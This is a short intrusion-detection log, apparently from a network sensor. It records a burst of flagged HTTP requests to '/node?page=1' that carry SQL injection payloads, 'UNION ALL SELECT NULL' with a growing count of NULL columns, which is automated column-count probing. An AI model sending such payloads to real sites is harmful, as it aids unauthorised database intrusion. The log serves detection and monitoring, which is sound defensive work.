2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL-- cdBr	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL-- cdBr	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL-- ooUN	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL-- ooUN	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL-- kgmT	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL-- kgmT	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- XTso	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- XTso	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- faSl	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- faSl	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- gvqb	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- gvqb	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zzYr	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zzYr	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nxdo	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nxdo	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IOnj	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IOnj	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TuiF	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TuiF	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL-- hPrB	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL-- hPrB	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL-- ZwLl	script-HTTP::URI_SQLI
2021-09-12T19:03	/node?page=1 UNION ALL SELECT NULL,NULL-- ZwLl	script-HTTP::URI_SQLI
